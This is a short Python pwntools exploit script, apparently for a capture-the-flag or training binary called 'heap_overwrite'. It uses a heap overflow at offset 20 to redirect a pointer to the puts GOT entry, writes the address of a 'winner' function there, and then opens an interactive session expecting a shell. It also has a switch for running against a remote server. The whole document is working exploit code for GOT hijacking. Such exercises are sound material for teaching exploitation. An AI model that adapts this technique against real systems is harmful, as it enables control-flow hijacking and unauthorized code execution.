from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './heap_overwrite'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Offset to overwrite i2->name with got.puts (found with GDB)
offset = 20

# Build the arg1 payload to write the got.puts address
arg1 = flat({
    offset: elf.got.puts
})

# Build arg2 payload to overwrite got.puts with winner()
arg2 = flat(elf.functions.winner)

# We can't send null bytes as argv, so strip them
io = start([arg1.strip(b'\x00'), arg2.strip(b'\x00')])

# Got Shell?
io.interactive()
